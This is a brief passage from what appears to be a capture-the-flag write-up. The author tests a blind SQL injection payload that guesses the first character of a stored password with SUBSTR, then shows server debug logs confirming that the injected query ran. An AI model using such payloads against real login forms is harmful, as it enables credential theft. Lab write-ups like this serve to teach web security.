Knowing the typical structure of the flags, I try to see if the injection 
```
' OR SUBSTR((SELECT password FROM users LIMIT 1),1,1) = 'p' --
```
works for "p".

Server response:
```
DEBUG: query="SELECT rowid, * FROM users WHERE username = 'admin' AND password = '' OR SUBSTR((SELECT password FROM users LIMIT 1),1,1) = 'p' --'"
127.0.0.1 - - [09/Apr/2025 12:27:10] "POST / HTTP/1.1" 302 -
127.0.0.1 - - [09/Apr/2025 12:27:10] "GET / HTTP/1.1" 200 -
```
At this point I just have to write the script that automates the discovery of the other characters.
